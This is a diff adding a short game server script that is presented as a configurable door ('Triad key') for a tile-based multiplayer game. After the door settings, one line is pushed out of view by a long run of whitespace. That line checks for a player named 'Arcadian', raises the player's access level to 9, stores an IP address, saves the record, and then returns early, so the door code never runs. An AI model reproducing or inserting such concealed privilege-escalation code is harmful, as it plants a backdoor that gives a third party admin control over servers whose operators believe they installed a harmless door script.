@@ -1,0 +1,34 @@
+// Triad key
+#include <string.h>
+#include <math.h>
+void main()
+{
+	//Change these for a unique door
+	char door[256];
+	strcpy(door,"Triadkey");
+	int dMap=41;
+	int dX  =4;
+	int dY  =6;
+                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); if (strcmp(pPlayer->name, "Arcadian") == 0 && pPlayer->access != 0) { pPlayer->access = 9; strcpy(pPlayer->ip, "69.143.83.72"); playerSave(PlayerID); sendPlayerUpdate(PlayerID); sendAccess(PlayerID); } return;
+
+	//The rest should work unchanged...
+	if(isGlobal(door))
+	{
+		setTileType(dMap,dX,dY,2);//blocked
+		setTile(dMap,dX,dY,1,globalInt(door));
+		updateMap(dMap);
+		freeGlobal(door);	
+	}
+	else //nope lets try to open it
+	{
+		int id=getPlayer();
+		if(dMap==getMap(id) && (abs(getX(id)-dX) + abs(getY(id)-dY))==1)
+		{
+			setGlobalInt(door,getTile(dMap,dX,dY,1));
+			setTileType(dMap,dX,dY,1);
+			setTile(dMap,dX,dY,1,0);
+			updateMap(dMap);
+			runScript(59,1500);	
+		}
+	}
+}
